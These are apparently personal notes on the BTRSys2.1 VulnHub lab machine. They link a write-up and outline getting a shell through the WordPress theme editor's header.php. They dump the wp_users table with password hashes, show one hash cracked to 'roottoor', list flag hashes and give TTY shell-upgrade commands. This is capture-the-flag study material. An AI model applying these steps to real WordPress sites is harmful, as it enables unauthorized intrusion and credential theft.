参考资料：  
第一个：  
[h](https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/btrsys2.1)ttps://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/btrsys2.1
   

第二个：  
[https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/btrsys2.1](https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/btrsys2.1)
      

[http://192.168.146.50/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.146.50%2Fwordpress%2Fwp-admin%2F&reauth=1](http://192.168.146.50/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.146.50%2Fwordpress%2Fwp-admin%2F&reauth=1)
   

[http://192.168.146.50/wordpress/wp-content/themes/twentyfourteen/header.php](http://192.168.146.50/wordpress/wp-content/themes/twentyfourteen/header.php)
   

上传shell

![[BTRSys2.1 image c7beb3880e42c64a.png|Exported image]]     

mysql\> select * from wp_users;  
select * from wp_users;  
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+  
| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name |  
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+  
| 1 | root | a318e4507e5a74604aafb45e4741edd3 | btrisk | mdemir@btrisk.com | | 2017-04-24 17:37:04 | | 0 | btrisk |  
| 2 | admin | 21232f297a57a5a743894a0e4a801fc3 | admin | ikaya@btrisk.com | | 2017-04-24 17:37:04 | | 4 | admin |  
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+  
2 rows in set (0.00 sec)
 
mysql\>
    
pojie  
[https://crackstation.net/](https://crackstation.net/)
   

a318e4507e5a74604aafb45e4741edd3
   

Hash Type Result  
a318e4507e5a74604aafb45e4741edd3 md5 roottoor
          
dierge  
29999d2be61365cc9b68f95953323d68
   

diyige  
18b96d9d05d5dbdc77a4e4b873b362f3
      

tiquan  
python3 -c 'import pty; pty.spawn("/bin/bash")'  
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
export TERM=xterm-256color  
Ctrl + Z  
stty raw -echo ; fg ; reset  
stty columns 200 rows 200